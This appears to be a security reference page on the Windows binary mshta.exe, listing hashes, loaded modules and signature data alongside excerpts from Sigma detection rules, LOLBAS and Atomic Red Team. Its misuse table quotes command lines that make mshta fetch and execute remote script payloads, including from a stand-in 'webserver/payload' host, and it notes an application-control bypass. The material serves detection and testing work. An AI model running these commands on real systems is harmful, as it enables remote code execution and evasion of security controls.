---
title: mshta.exe | Microsoft (R) HTML Application host
excerpt: What is mshta.exe?
---

# mshta.exe 

* File Path: `C:\Windows\system32\mshta.exe`
* Description: Microsoft (R) HTML Application host

## Hashes

Type | Hash
-- | --
MD5 | `F328FDCFF05BF02C2C986D52AED8BC2A`
SHA1 | `DD8B22ACEA424823BB64ABF71F61A03D41177C38`
SHA256 | `E616C5CE71886652C13E2E1FA45A653B44D492B054F16B15A38418B8507F57C7`
SHA384 | `0E55ADA950494D9A7F6E0425BC2A7B8D9586F3B356F5D1E70427266EB58CFAC06B80FFF0B6ADBE803B46A9E5C9B450E6`
SHA512 | `EE6EB657562C746737E89ADB7C6E0D142FDDE8CADA1725EDF15BC82DF623A9AB547BDAB5830B811CE87D5F0F6FEED87B3194BC80544780F9914FDF96571023DE`
SSDEEP | `192:ZA27mrbZUIhKPxwya+TW0/z5S7X6Bz3vEXPXWwG/IR:T7wFXh6mD+TW0kXSvEXfWwG`
IMP | `42DA177DE2FAA97C3DFAEC9562772A7F`
PESHA1 | `B52EDABFCEE656CC77281EF1A876BBBF95048EC7`
PE256 | `3537A373EABD126B60E0A743950C5744271341D06E91491F86F4418886A11EF2`

## Runtime Data

### Loaded Modules:

Path |
-- |
C:\Windows\System32\ADVAPI32.dll |
C:\Windows\System32\bcrypt.dll |
C:\Windows\System32\bcryptPrimitives.dll |
C:\Windows\System32\clbcatq.dll |
C:\Windows\System32\combase.dll |
C:\Windows\System32\CRYPT32.dll |
C:\Windows\system32\CRYPTBASE.DLL |
C:\Windows\System32\CRYPTSP.dll |
C:\Windows\system32\dwmapi.dll |
C:\Windows\System32\GDI32.dll |
C:\Windows\System32\gdi32full.dll |
C:\Windows\system32\iertutil.dll |
C:\Windows\System32\IMM32.DLL |
C:\Windows\System32\kernel.appcore.dll |
C:\Windows\System32\KERNEL32.DLL |
C:\Windows\System32\KERNELBASE.dll |
C:\Windows\System32\MSASN1.dll |
C:\Windows\System32\MSCTF.dll |
C:\Windows\system32\mshta.exe |
C:\Windows\System32\mshtml.dll |
C:\Windows\system32\msIso.dll |
C:\Windows\System32\msvcp_win.dll |
C:\Windows\System32\msvcrt.dll |
C:\Windows\system32\netutils.dll |
C:\Windows\SYSTEM32\ntdll.dll |
C:\Windows\System32\OLE32.dll |
C:\Windows\System32\OLEAUT32.dll |
C:\Windows\System32\powrprof.dll |
C:\Windows\System32\profapi.dll |
C:\Windows\System32\RPCRT4.dll |
C:\Windows\System32\sechost.dll |
C:\Windows\System32\shcore.dll |
C:\Windows\System32\shlwapi.dll |
C:\Windows\system32\srpapi.dll |
C:\Windows\system32\SspiCli.dll |
C:\Windows\System32\ucrtbase.dll |
C:\Windows\system32\urlmon.dll |
C:\Windows\System32\USER32.dll |
C:\Windows\system32\uxtheme.dll |
C:\Windows\System32\win32u.dll |
C:\Windows\System32\windows.storage.dll |
C:\Windows\system32\WINHTTP.dll |
C:\Windows\system32\wkscli.dll |
C:\Windows\WinSxS\amd64_microsoft.windows.common-controls_6595b64144ccf1df_5.82.17763.1518_none_6d08fefc59f73326\COMCTL32.dll |
C:\Windows\WinSxS\amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.17763.1518_none_de6e2bd0534e2567\comctl32.dll |


## Signature

* Status: Signature verified.
* Serial: `33000001C422B2F79B793DACB20000000001C4`
* Thumbprint: `AE9C1AE54763822EEC42474983D8B635116C8452`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: MSHTA.EXE.MUI
* Product Name: Internet Explorer
* Company Name: Microsoft Corporation
* File Version: 11.00.17763.1 (WinBuild.160101.0800)
* Product Version: 11.00.17763.1
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.
* Machine Type: 64-bit

## File Scan

* VirusTotal Detections: 0/71
* VirusTotal Link: https://www.virustotal.com/gui/file/e616c5ce71886652c13e2e1fa45a653b44d492b054f16b15a38418b8507f57c7/detection/


## Possible Misuse

*The following table contains possible examples of `mshta.exe` being misused. While `mshta.exe` is **not** inherently malicious, its legitimate functionality can be abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[sigma](https://github.com/Neo23x0/sigma) | [godmode_sigma_rule.yml](https://github.com/Neo23x0/sigma/blob/master/other/godmode_sigma_rule.yml) | `- '\mshta.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_mshta_execution.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/builtin/win_susp_mshta_execution.yml) | `title: MSHTA Suspicious Execution 01` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_mshta_execution.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/builtin/win_susp_mshta_execution.yml) | `description: Detection for mshta.exe suspicious execution patterns sometimes involving file polyglotism` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_mshta_execution.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/builtin/win_susp_mshta_execution.yml) | `Image: '*\mshta.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [sysmon_suspicious_dbghelp_dbgcore_load.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/image_load/sysmon_suspicious_dbghelp_dbgcore_load.yml) | `- '\mshta.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_apt_babyshark.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_apt_babyshark.yml) | `- powershell.exe mshta.exe http*` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_apt_ta505_dropper.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_apt_ta505_dropper.yml) | `description: Detects mshta loaded by wmiprvse as parent as used by TA505 malicious documents` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_apt_ta505_dropper.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_apt_ta505_dropper.yml) | `Image\|endswith: '\mshta.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_exploit_cve_2017_11882.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_exploit_cve_2017_11882.yml) | `description: Detects exploits that use CVE-2017-11882 to start EQNEDT32.EXE and other sub processes like mshta.exe` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_lethalhta.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_lethalhta.yml) | `title: MSHTA Spwaned by SVCHOST` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_lethalhta.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_lethalhta.yml) | `description: Detects MSHTA.EXE spwaned by SVCHOST as seen in LethalHTA and described in report` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_lethalhta.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_lethalhta.yml) | `Image: '*\mshta.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_mshta_javascript.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_mshta_javascript.yml) | `title: Mshta JavaScript Execution` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_mshta_javascript.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_mshta_javascript.yml) | `description: Identifies suspicious mshta.exe commands` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_mshta_javascript.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_mshta_javascript.yml) | `Image\|endswith: '\mshta.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_mshta_spawn_shell.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_mshta_spawn_shell.yml) | `title: MSHTA Spawning Windows Shell` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_mshta_spawn_shell.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_mshta_spawn_shell.yml) | `description: Detects a Windows command line executable started from MSHTA` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_mshta_spawn_shell.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_mshta_spawn_shell.yml) | `ParentImage: '*\mshta.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_office_shell.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_office_shell.yml) | `- '*\mshta.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_possible_applocker_bypass.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_possible_applocker_bypass.yml) | `#- '\mshta.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_renamed_binary.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_renamed_binary.yml) | `- 'mshta.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_renamed_binary.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_renamed_binary.yml) | `- '\mshta.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_renamed_binary_highly_relevant.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_renamed_binary_highly_relevant.yml) | `- "mshta.exe"` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_renamed_binary_highly_relevant.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_renamed_binary_highly_relevant.yml) | `- '*\mshta.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_shell_spawn_susp_program.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_shell_spawn_susp_program.yml) | `- '*\mshta.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_covenant.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_covenant.yml) | `- 'mshta file.hta'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_csc.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_csc.yml) | `- '*\mshta.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_powershell_parent_process.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_powershell_parent_process.yml) | `- '\mshta.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_task_folder_evasion.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_task_folder_evasion.yml) | `description: The Tasks folder in system32 and syswow64 are globally writable paths. Adversaries can take advantage of this and load or influence any script hosts or ANY .NET Application in Tasks to load and execute a custom assembly into cscript, wscript, regsvr32, mshta, eventvwr` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [sysmon_cactustorch.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/sysmon/sysmon_cactustorch.yml) | `- '*\System32\mshta.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [sysmon_suspicious_remote_thread.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/sysmon/sysmon_suspicious_remote_thread.yml) | `- '\mshta.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Mshta.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Mshta.yml) | `Name: Mshta.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Mshta.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Mshta.yml) | `- Command: mshta.exe evilfile.hta` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Mshta.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Mshta.yml) | `- Command: mshta.exe vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Mshta.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Mshta.yml) | `- Command: mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSBinaries/Payload/Mshta_calc.sct").Exec();close();` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Mshta.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Mshta.yml) | `- Command: mshta.exe "C:\ads\file.txt:file.hta"` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Mshta.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Mshta.yml) | `- Path: C:\Windows\System32\mshta.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Mshta.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Mshta.yml) | `- Path: C:\Windows\SysWOW64\mshta.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Mshta.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Mshta.yml) | `- IOC: mshta.exe executing raw or obfuscated script within the command-line` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Mshta.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Mshta.yml) | `- Link: https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/mshta.sct` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Mshtml.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Mshtml.yml) | `Description: Invoke an HTML Application via mshta.exe (Note - Pops a security warning and a print dialogue box).` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Url.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Url.yml) | `UseCase: Invoke an HTML Application via mshta.exe (Default Handler).` | 
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [hta.md](https://github.com/redcanaryco/atomic-red-team/blob/master/ARTifacts/Initial_Access/hta.md) | ## MSHTA - Explorer Spawning CMD | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [hta.md](https://github.com/redcanaryco/atomic-red-team/blob/master/ARTifacts/Initial_Access/hta.md) | Using COM objects, mshta runs with no child processes. Explorer.exe spawns and executes cmd -> calc. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [hta.md](https://github.com/redcanaryco/atomic-red-team/blob/master/ARTifacts/Initial_Access/hta.md) | ## MSHTA - Wmiprvse Spawning CMD | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [hta.md](https://github.com/redcanaryco/atomic-red-team/blob/master/ARTifacts/Initial_Access/hta.md) | Using COM objects, mshta runs with no child processes. Wmiprvse spawns and executes cmd -> calc. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [hta.md](https://github.com/redcanaryco/atomic-red-team/blob/master/ARTifacts/Initial_Access/hta.md) | ## MSHTA spawning CMD | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [hta.md](https://github.com/redcanaryco/atomic-red-team/blob/master/ARTifacts/Initial_Access/hta.md) | Mshta spawns child process of calc.exe. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [hta.md](https://github.com/redcanaryco/atomic-red-team/blob/master/ARTifacts/Initial_Access/hta.md) | // Child of mshta.exe | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md) | - [T1218.005 Mshta](../../T1218.005/T1218.005.md) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md) | - Atomic Test #1: Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md) | - Atomic Test #2: Mshta executes VBScript to execute malicious command [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md) | - Atomic Test #3: Mshta Executes Remote HTML Application (HTA) [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md) | - Atomic Test #9: Powershell invoke mshta.exe download [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [windows-index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/windows-index.md) | - [T1218.005 Mshta](../../T1218.005/T1218.005.md) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [windows-index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/windows-index.md) | - Atomic Test #1: Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [windows-index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/windows-index.md) | - Atomic Test #2: Mshta executes VBScript to execute malicious command [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [windows-index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/windows-index.md) | - Atomic Test #3: Mshta Executes Remote HTML Application (HTA) [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [windows-index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/windows-index.md) | - Atomic Test #9: Powershell invoke mshta.exe download [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [matrix.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Matrices/matrix.md) | \|  \|  \| [SSH Authorized Keys](../../T1098.004/T1098.004.md) \| [Sudo and Sudo Caching](../../T1548.003/T1548.003.md) \| [Mshta](../../T1218.005/T1218.005.md) \|  \|  \|  \|  \|  \|  \|  \| | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [windows-matrix.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Matrices/windows-matrix.md) | \|  \|  \| [Screensaver](../../T1546.002/T1546.002.md) \| Time Providers [CONTRIBUTE A TEST](https://atomicredteam.io/contributing) \| [Mshta](../../T1218.005/T1218.005.md) \|  \|  \|  \|  \|  \|  \|  \| | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1059.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md) | - [Atomic Test #9 - Powershell invoke mshta.exe download](#atomic-test-9---powershell-invoke-mshtaexe-download) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1059.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md) | ## Atomic Test #9 - Powershell invoke mshta.exe download | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1059.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md) | Powershell invoke mshta to download payload. Upon execution, a new PowerShell window will be opened which will display "Download Cradle test success!". | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1059.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md) | \| url \| url of payload to execute \| url \| https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct\| | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1059.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md) | C:\Windows\system32\cmd.exe /c "mshta.exe javascript:a=GetObject('script:#{url}').Exec();close()" | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1059.005.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.005/T1059.005.md) | Get-WmiObject win32_process \| Where-Object {$_.CommandLine -like "*mshta*"}  \| % { "$(Stop-Process $_.ProcessID)" } \| Out-Null | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.005.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.005/T1218.005.md) | # T1218.005 - Mshta | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.005.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.005/T1218.005.md) | <blockquote>Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017)  | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.005.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.005/T1218.005.md) | Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.005.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.005/T1218.005.md) | Files may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))</code> | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.005.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.005/T1218.005.md) | They may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code> | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.005.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.005/T1218.005.md) | Mshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)</blockquote> | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.005.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.005/T1218.005.md) | - [Atomic Test #1 - Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject](#atomic-test-1---mshta-executes-javascript-scheme-fetch-remote-payload-with-getobject) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.005.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.005/T1218.005.md) | - [Atomic Test #2 - Mshta executes VBScript to execute malicious command](#atomic-test-2---mshta-executes-vbscript-to-execute-malicious-command) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1218.005.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.005/T1218.005.md) | - [Atomic Test #3 - Mshta Executes Remote HTML Application (HTA)](#atomic-test-3---mshta-executes-remote-html-application-hta) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
